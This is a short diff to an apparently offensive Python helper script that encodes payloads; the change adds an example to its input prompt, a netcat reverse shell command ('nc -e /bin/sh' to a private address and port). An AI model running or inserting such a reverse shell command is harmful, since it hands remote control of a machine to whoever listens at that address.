@@ -22,7 +22,7 @@ def encode_payload(payload):
 
 # Example usage
 if __name__ == "__main__":
-    raw = input("Enter raw payload: ").strip()
+    raw = input("Enter raw payload (eg. nc -e /bin/sh 192.168.1.10 4444): ").strip()
     result = encode_payload(raw)
 
     print("\n== Encoded Versions ==")
